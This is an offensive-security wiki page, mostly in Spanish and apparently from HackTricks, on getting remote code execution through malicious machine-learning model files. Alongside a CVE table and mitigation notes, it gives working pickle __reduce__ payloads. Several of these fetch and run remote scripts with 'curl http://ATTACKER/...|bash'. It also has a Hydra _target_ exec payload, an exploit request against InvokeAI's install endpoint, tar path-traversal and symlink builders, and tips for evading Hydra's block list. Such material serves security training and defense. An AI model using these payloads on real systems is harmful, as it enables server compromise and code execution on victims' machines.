# Modelos RCE

{{#include ../banners/hacktricks-training.md}}

## Cargando modelos para RCE

Los modelos de Machine Learning suelen compartirse en diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden cargarse en las máquinas de los desarrolladores o en sistemas de producción para su uso. Normalmente los modelos no deberían contener código malicioso, pero hay casos en los que el modelo puede usarse para ejecutar código arbitrario en el sistema como funcionalidad prevista o debido a una vulnerabilidad en la librería de carga de modelos.

Al momento de la redacción, estos son algunos ejemplos de este tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerabilidad (CVE si está disponible)**                                                    | **Vector RCE**                                                                                                                           | **Referencias**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialización insegura en* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malicioso en el checkpoint del modelo conduce a ejecución de código (omitiendo la protección `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + descarga de modelo malicioso causa ejecución de código; deserialización Java RCE en la API de gestión                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserialización insegura de checkpoint vía `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint no confiable activa el pickle reducer durante `load_model_trainer_states_from_checkpoint` → ejecución de código en el worker de ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar modelo desde YAML usa `yaml.unsafe_load` (ejecución de código) <br> Cargar un modelo con la capa **Lambda** ejecuta código Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parseo TFLite)                                                                                          | Un `.tflite` confeccionado provoca desbordamiento entero → corrupción de heap (RCE potencial)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Cargar un modelo vía `joblib.load` ejecuta pickle con el payload `__reduce__` del atacante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputado*                                                                              | El comportamiento por defecto de `numpy.load` permitía arrays de objetos pickled – un `.npy/.npz` malicioso desencadena ejecución de código                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (travesía de directorios) <br> **CVE-2024-5187** (travesía en tar)                                                    | La ruta external-weights de un modelo ONNX puede escapar del directorio (leer archivos arbitrarios) <br> Un tar de modelo ONNX malicioso puede sobrescribir archivos arbitrarios (conduciendo a RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modelo con operador personalizado exige cargar código nativo del atacante; grafos complejos de modelo abusan de la lógica para ejecutar computaciones no previstas   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (travesía de rutas)                                                                                          | Usar la API de carga de modelos con `--model-control` habilitado permite travesía de rutas relativas para escribir archivos (p.ej., sobrescribir `.bashrc` para RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (múltiples desbordamientos de heap)                                                                         | Un archivo GGUF malformado provoca desbordamientos de buffer en el parser, permitiendo ejecución de código arbitrario en el sistema víctima                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un modelo HDF5 (`.h5`) malicioso con código en la capa Lambda aún se ejecuta al cargar (Keras safe_mode no cubre el formato antiguo – “downgrade attack”) | |
| **Others** (general)        | *Fallo de diseño* – Pickle serialization                                                                                         | Muchas herramientas de ML (p.ej., formatos de modelos basados en pickle, Python `pickle.load`) ejecutarán código arbitrario embebido en archivos de modelo a menos que se mitigue | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadatos no confiables pasados a `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadatos/config de modelo controlados por el atacante ponen `_target_` a un callable arbitrario (p.ej., `builtins.exec`) → se ejecuta durante la carga, incluso con formatos “seguros” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Además, hay algunos modelos basados en pickle de Python como los usados por [PyTorch](https://github.com/pytorch/pytorch/security) que pueden usarse para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Por lo tanto, cualquier modelo basado en pickle podría ser especialmente susceptible a este tipo de ataques, incluso si no aparecen en la tabla anterior.

### Hydra metadata → RCE (funciona incluso con safetensors)

`hydra.utils.instantiate()` importa y llama cualquier `_target_` punteado en un objeto de configuración/metadata. Cuando las librerías alimentan **metadata de modelo no confiable** a `instantiate()`, un atacante puede suministrar un callable y argumentos que se ejecutan inmediatamente durante la carga del modelo (no se requiere pickle).

Ejemplo de payload (funciona en `.nemo` `model_config.yaml`, repo `config.json`, o `__metadata__` dentro de `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- Se desencadena antes de la inicialización del modelo en NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, y FlexTok loaders.
- La lista de bloqueo de cadenas de Hydra es evadible vía rutas de importación alternativas (p. ej., `enum.bltns.eval`) o nombres resueltos por la aplicación (p. ej., `nemo.core.classes.common.os.system` → `posix`).
- FlexTok también parsea metadata en forma de string con `ast.literal_eval`, habilitando DoS (sobrecarga de CPU/memoria) antes de la llamada a Hydra.

### 🆕  InvokeAI RCE vía `torch.load` (CVE-2024-12029)

`InvokeAI` es una popular interfaz web de código abierto para Stable-Diffusion. Las versiones **5.3.1 – 5.4.2** exponen el endpoint REST `/api/v2/models/install` que permite a los usuarios descargar y cargar modelos desde URLs arbitrarias.

Internamente el endpoint finalmente llama a:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Cuando el archivo suministrado es un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza una **pickle deserialization**. Dado que el contenido procede directamente de una URL controlada por el usuario, un atacante puede incrustar un objeto malicioso con un método personalizado `__reduce__` dentro del checkpoint; el método se ejecuta **durante la deserialización**, lo que conduce a **remote code execution (RCE)** en el servidor InvokeAI.

La vulnerabilidad fue asignada **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guía de explotación

1. Crear un checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Aloja `payload.ckpt` en un servidor HTTP que controles (por ejemplo `http://ATTACKER/payload.ckpt`).
3. Activa el endpoint vulnerable (no se requiere autenticación):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Cuando InvokeAI descarga el archivo llama a `torch.load()` → el gadget `os.system` se ejecuta y el atacante obtiene ejecución de código en el contexto del proceso InvokeAI.

Exploit listo para usar: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo el flujo.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` alcanzable por el atacante  
•  El proceso tiene permisos para ejecutar comandos de shell

#### Mitigations

* Actualizar a **InvokeAI ≥ 5.4.3** – el parche establece `scan=True` por defecto y realiza un escaneo de malware antes de la deserialización.  
* Al cargar checkpoints programáticamente use `torch.load(file, weights_only=True)` o el nuevo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Imponer allow-lists / firmas para las fuentes de modelos y ejecutar el servicio con el principio de menor privilegio.

> ⚠️ Recuerde que **cualquier** formato basado en Python pickle (incluyendo muchos `.pt`, `.pkl`, `.ckpt`, `.pth` files) es inherentemente inseguro para deserializar desde fuentes no confiables.

---

Ejemplo de una mitigación ad-hoc si necesita mantener versiones antiguas de InvokeAI ejecutándose detrás de un proxy inverso:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE mediante `torch.load` inseguro (CVE-2025-23298)

NVIDIA’s Transformers4Rec (parte de Merlin) expuso un cargador de checkpoints inseguro que llamaba directamente a `torch.load()` con rutas proporcionadas por el usuario. Dado que `torch.load` se basa en `pickle` de Python, un checkpoint controlado por un atacante puede ejecutar código arbitrario mediante un reducer durante la deserialización.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por qué esto conduce a RCE: En Python pickle, un objeto puede definir un reducer (`__reduce__`/`__setstate__`) que devuelve un callable y sus argumentos. El callable se ejecuta durante el unpickling. Si un objeto así está presente en un checkpoint, se ejecuta antes de que se utilicen los pesos.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Checkpoints/modelos troyanizados compartidos vía repositorios, buckets, o artifact registries
- Pipelines automatizados de resume/deploy que cargan checkpoints automáticamente
- La ejecución ocurre dentro de training/inference workers, a menudo con privilegios elevados (p. ej., root en containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) reemplazó la llamada directa a `torch.load()` por un deserializador restringido y allow-listed implementado en `transformers4rec/utils/serialization.py`. El nuevo loader valida tipos/campos y evita que callables arbitrarios sean invocados durante la carga.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Aplicar la procedencia/firmas del modelo y deserialización en sandbox (seccomp/AppArmor; usuario no-root; FS restringido y sin salida de red).
- Monitorizar procesos hijo inesperados de los servicios ML en el momento de carga del checkpoint; trazar el uso de `torch.load()`/`pickle`.

POC y referencias de vulnerabilidad/parche:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Cargar el modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD expone un endpoint `resnet` que deserializes user-controlled data. ZDI confirmó que un atacante remoto puede coaccionar a una víctima para que cargue una página/archivo malicioso, hacer que este envíe un crafted serialized blob a ese endpoint y desencadenar deserialization como `root`, provocando una compromisión total.

El flujo del exploit refleja el abuso típico de pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## Modelos a Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
O bien, con el siguiente código puedes crear un modelo que creará un symlink al directorio `/tmp` cuando se cargue:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Análisis en profundidad: Keras .keras deserialization and gadget hunting

Para una guía centrada en los internals de .keras, Lambda-layer RCE, el problema de importación arbitraria en ≤ 3.8 y el descubrimiento de gadgets post-fix dentro de la allowlist, vea:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referencias

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – consideraciones de seguridad para torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
